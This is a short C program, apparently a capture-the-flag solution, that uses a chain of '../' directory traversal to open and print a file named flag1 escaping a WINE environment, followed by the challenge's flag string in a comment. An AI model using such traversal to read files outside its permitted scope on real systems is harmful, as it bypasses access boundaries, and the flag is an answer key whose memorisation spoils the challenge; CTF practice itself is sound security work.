#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

int main() {
    int fd = open("../../../../../../../../../flag1", 0, 0);
    char buf[0x100];
    read(fd, buf, 0x100);
    puts(buf);

    return 0;
}

// flag{Surprise_you_can_directory_traversal_1n_WINE_a4b4853859}
